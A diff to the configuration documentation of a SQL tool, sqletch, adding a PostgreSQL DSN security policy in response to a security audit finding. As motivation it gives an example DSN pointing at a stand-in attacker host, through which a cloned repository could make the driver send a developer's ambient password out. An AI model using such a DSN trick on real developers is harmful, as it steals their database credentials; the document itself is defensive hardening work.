@@ -14,6 +14,8 @@ dialect: postgres            # required; v0.1: postgres only
 server_version: "16.4"       # required; cache-key + container tag + pin
 database:
   # dsn: postgres://…        # optional, LITERAL only (no ${VAR} expansion);
+                             # PG: allow-listed keys, one host, ambient
+                             # passwords only for loopback (DSN policy below)
                              # empty = auto-managed disposable container.
                              # SQLite: a FILE PATH, resolved against the
                              # config dir like every other path (":memory:"
@@ -53,10 +55,61 @@ combinations named in the message). Config values are **literal**:
 there is deliberately no `${VAR}` environment expansion (removed
 2026-08 as a secret-exfiltration / SSRF vector — a cloned repo could
 otherwise splice the caller's environment, including secrets, into
-`database.dsn` and point it at an attacker host). An operator who
-wants the DSN from the environment leaves `database.dsn` empty and
-relies on the driver's own DSN environment variables, or templates the
-config file outside sqletch.
+`database.dsn` and point it at an attacker host). An empty
+`database.dsn` means an auto-managed disposable container/temp file,
+NOT "take the DSN from the environment". An operator who wants
+environment-supplied settings writes a minimal DSN and lets the
+driver fill the keys it omits (on PostgreSQL `dsn: "dbname=dev"` takes
+PGHOST/PGPORT/PGUSER/… from the shell — subject to the DSN policy
+below), or templates the config file outside sqletch.
+
+### Dev-database DSN policy (PostgreSQL; security audit F4, owner decision 2026-10-21 "loopback only")
+
+`database.dsn` is repo-controlled, but pgx fills every key it omits
+from the *running developer's* environment (PGPASSWORD, PGPASSFILE /
+`~/.pgpass`, PGSERVICE / `~/.pg_service.conf`, client TLS files),
+honours `passfile`/`service`/`servicefile`/`sslkey`/`sslcert` keys in
+the DSN itself, offers one password to every host of a multi-host
+DSN, and by default answers a cleartext-password request. Removing
+`${VAR}` expansion did not close this: `dsn:
+postgres://attacker.example/x` still shipped PGPASSWORD to the
+attacker. `postgres.DevConnConfig` (internal/dialect/postgres/devdsn.go
+— the only package allowed to import pgx/pgconn) is the one place a
+user-supplied PostgreSQL DSN becomes a connection config, used by
+`devdb.Acquire` before anything is dialed:
+
+1. **Allow-listed keys only** (`pgconn.ParseConfigOptions.ConnStringAllowedKeys`,
+   checked before pgx touches the filesystem or the network): `host`,
+   `port`, `dbname`, `user`, `password`, `sslmode` (with the URI
+   `ssl=true` alias), `connect_timeout`, `application_name`. Anything
+   else — `passfile`, `service`, `servicefile`, `sslkey`, `sslcert`,
+   `sslrootcert`, `sslpassword`, `hostaddr`, `require_auth`,
+   `target_session_attrs`, arbitrary runtime parameters — is
+   **SQLETCH321**. Additions need evidence the key reads no file,
+   cannot redirect the connection and cannot relax authentication.
+2. **Exactly one host/port** (the effective one, after environment
+   defaults): a host list is **SQLETCH321**. The plaintext retry of the
+   same host that `sslmode=prefer` adds is not a second host.
+3. **Loopback host** (`localhost`, 127.0.0.0/8, `::1`, a unix-socket
+   directory): libpq's ordinary behavior — an ambient password from
+   PGPASSWORD/`.pgpass`/a service file is used.
+4. **Any other host** (judged on the effective host, even when it came
+   from PGHOST — the rule is about where the password goes): only a
+   password the DSN itself states, non-empty, is used; anything ambient
+   is discarded (and a resulting connect failure says so). A stated
+   *empty* password does not count — pgx would fill it from the
+   passfile — so the stated value is read from a re-parse with the
+   passfile pinned to the null device. `require_auth=scram-sha-256` is
+   forced, so cleartext and MD5 requests are refused and trust auth is
+   refused too.
+
+Ambient settings that are not credentials (PGUSER, PGSSLMODE, a client
+certificate from `~/.postgresql`, which proves possession without
+disclosing the key) still apply. sqletch's own container DSN is not
+repo-controlled and bypasses the policy. MySQL DSNs are outside this
+decision: neither MySQL client sqletch uses (go-mysql for the dev
+database, go-sql-driver in generated code) completes a DSN from the
+environment or a password file.
 
 `cache.path` and each target's `output.path` drive every write sqletch
 performs, so they are validated (`SQLETCH306`) — at `Load` for a
